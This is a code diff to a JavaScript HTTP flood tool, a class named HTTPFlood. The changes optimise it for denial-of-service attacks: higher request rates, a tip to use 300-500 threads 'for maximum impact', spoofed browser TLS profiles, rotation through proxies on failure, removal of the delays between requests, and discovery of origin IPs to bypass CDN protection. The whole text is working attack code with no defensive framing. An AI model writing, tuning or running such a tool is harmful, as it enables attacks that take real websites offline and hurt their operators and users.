@@ -522,6 +522,10 @@ class HTTPFlood {
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
         
+        const estimatedRPS = this.threads * (config.proxies.length > 0 ? 0.8 : 1.5);
+        console.log(`[*] Estimated RPS: ${Math.floor(estimatedRPS * 100)}-${Math.floor(estimatedRPS * 150)} req/s`);
+        console.log(`[!] TIP: Use 300-500 threads for maximum impact`);
+        
         if (this.useOrigin && this.domain) {
             this.originIPs = await discoverOriginIPs(this.domain);
         }
@@ -540,11 +544,20 @@ class HTTPFlood {
         let consecutiveFails = 0;
         let localCount = 0;
         
+        const profile = getRandomElement(BROWSER_PROFILES);
+        let cachedAgent = null;
+        
+        if (config.proxies.length > 0) {
+            const proxy = config.proxies[currentProxyIndex];
+            cachedAgent = createTLSAgent(profile, proxy);
+        } else {
+            cachedAgent = createTLSAgent(profile, null);
+        }
+        
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
             try {
-                const profile = getRandomElement(BROWSER_PROFILES);
                 const headers = getAdvancedHeaders(this.url, profile);
                 
                 let targetUrl = this.url;
@@ -562,38 +575,27 @@ class HTTPFlood {
                     method: this.method.toLowerCase(),
                     url: targetUrl,
                     headers,
-                    timeout: 3000,
-                    maxRedirects: 5,
+                    timeout: 1000,
+                    maxRedirects: 0,
                     validateStatus: () => true,
-                    decompress: true
+                    decompress: false,
+                    proxy: false,
+                    httpsAgent: cachedAgent,
+                    httpAgent: cachedAgent
                 };
                 
-                if (config.proxies.length > 0) {
-                    const proxy = config.proxies[currentProxyIndex];
-                    axiosConfig.proxy = false;
-                    axiosConfig.httpsAgent = createTLSAgent(profile, proxy);
-                    axiosConfig.httpAgent = createTLSAgent(profile, proxy);
-                } else {
-                    axiosConfig.httpsAgent = createTLSAgent(profile, null);
-                    axiosConfig.httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100 });
-                }
-                
                 if (this.method === 'POST') {
-                    axiosConfig.data = { data: 'x'.repeat(Math.floor(Math.random() * 900) + 100) };
+                    axiosConfig.data = 'x'.repeat(500);
                 }
                 
                 const response = await axios(axiosConfig);
                 
-                const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? JSON.stringify(axiosConfig.data).length : 0);
+                const bytesSent = 800;
                 const bytesReceived = response.data ? String(response.data).length : 0;
                 
                 updateStats(true, response.status, bytesSent, bytesReceived);
                 
-                if (config.debug && localCount % 100 === 0) {
-                    console.log(`[DEBUG] Thread ${threadId}: ${response.status} - ${bytesSent}b sent, ${bytesReceived}b received`);
-                }
-                
-                if (config.proxies.length > 0 && localCount % 10 === 0) {
+                if (config.proxies.length > 0 && localCount % 20 === 0) {
                     const proxyIP = config.proxies[currentProxyIndex].replace(/^https?:\/\//, '').split(':')[0];
                     config.workingProxies.add(proxyIP);
                 }
@@ -605,16 +607,12 @@ class HTTPFlood {
                 updateStats(false);
                 consecutiveFails++;
                 
-                if (config.debug && consecutiveFails <= 3) {
-                    console.log(`[DEBUG] Thread ${threadId} error: ${error.message}`);
-                }
-                
-                if (consecutiveFails >= 2 && config.proxies.length > 0) {
+                if (consecutiveFails >= 3 && config.proxies.length > 0) {
                     currentProxyIndex = (currentProxyIndex + 1) % config.proxies.length;
+                    const proxy = config.proxies[currentProxyIndex];
+                    cachedAgent = createTLSAgent(profile, proxy);
                     consecutiveFails = 0;
                 }
-                
-                await new Promise(resolve => setTimeout(resolve, 10));
             }
         }
     }
